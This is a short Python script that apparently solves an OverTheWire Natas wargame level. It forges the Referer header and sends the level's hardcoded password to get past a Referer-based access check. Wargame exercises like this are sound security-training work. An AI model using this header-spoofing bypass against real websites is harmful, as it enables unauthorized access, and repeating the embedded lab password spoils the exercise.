import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas4.natas.labs.overthewire.org/'

username = 'natas4'
password = 'QryZXc2e0zahULdHrtHxzyYkj59kUxLQ'

headers = {
    'Referer': 'http://natas5.natas.labs.overthewire.org/'
}

responde = requests.post(url, auth=HTTPBasicAuth(username, password),
                         headers=headers)

print(responde.status_code)
print(responde.text)
